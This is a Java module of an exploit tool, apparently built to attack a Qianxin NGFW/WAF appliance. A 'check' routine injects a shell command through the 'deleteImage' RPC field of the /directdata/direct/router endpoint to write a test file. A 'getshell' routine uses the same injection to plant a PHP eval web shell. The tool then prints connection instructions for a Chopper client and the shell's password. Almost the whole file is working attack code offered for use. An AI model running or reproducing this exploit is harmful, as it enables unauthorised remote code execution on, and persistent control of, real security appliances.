package exp.equipment.qianxin;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class ngfw_waf_router implements Exploitlnterface{
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea, "nishizhu.txt", shell.Testpath);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url,textArea);
    }

    private  Boolean att(String url,TextArea textArea,String filename,String filepath){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");
        String postString = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '" + shell.readFile(filepath) +"' >/var/www/html/" + filename +  "\"]}],\"type\":\"rpc\",\"tid\":17}";
        Response post = HttpTools.post(url + "/directdata/direct/router", postString, head, "utf-8");
        if(post.getCode() == 200 && post.getText().contains("success")){
            Response response = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                textArea.appendText("\n 漏洞存在，测试文件已写入 \n" + url + "/" + filename);
                return true;
            }else {
                textArea.appendText("\n NGFW_waf_router-RCE-漏洞不存在 (出现误报请联系作者)");
                return false;
            }
        }else {
            textArea.appendText("\n NGFW_waf_router-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");
        String postString = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '9df37afc77bdd582d90aefaf4e35c63e<?php @eval($_POST[nishizhu]);?>' > /var/www/html/nishizhu.php\"]}],\"type\":\"rpc\",\"tid\":17}";
        HttpTools.post(url + "/directdata/direct/router", postString, head, "utf-8");
        Response response = HttpTools.get(url + "/nishizhu.php", new HashMap<String, String>(),"utf-8");
        if(response.getCode() == 200 && response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
            textArea.appendText("\n shell写入成功 \n" + url + "/nishizhu.php");
            textArea.appendText("\n 请使用菜刀连接  密码为 nishizhu");
            return true;
        }else {
            textArea.appendText("\n 疑似查杀 请自行复现");
            return false;
        }
    }
}
